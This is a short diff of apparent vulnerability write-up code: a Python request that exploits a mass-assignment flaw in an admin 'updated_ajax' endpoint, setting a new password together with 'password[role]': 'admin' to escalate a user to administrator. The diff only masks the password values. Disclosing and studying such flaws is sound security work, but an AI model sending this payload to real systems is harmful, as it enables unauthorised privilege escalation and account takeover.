@@ -55,8 +55,8 @@ The `updated_ajax` endpoint uses `params.require(:password).permit!` which allow
 data = {
     '_method': 'patch',
     'authenticity_token': token,
-    'password[password]': 'Testpass123!',
-    'password[password_confirmation]': 'Testpass123!',
+    'password[password]': 'Testpass****',
+    'password[password_confirmation]': 'Tes*****',
     'password[role]': 'admin',  # ← Mass assignment!
 }
 s.post(f'{BASE}/admin/users/{uid}/updated_ajax', data=data,
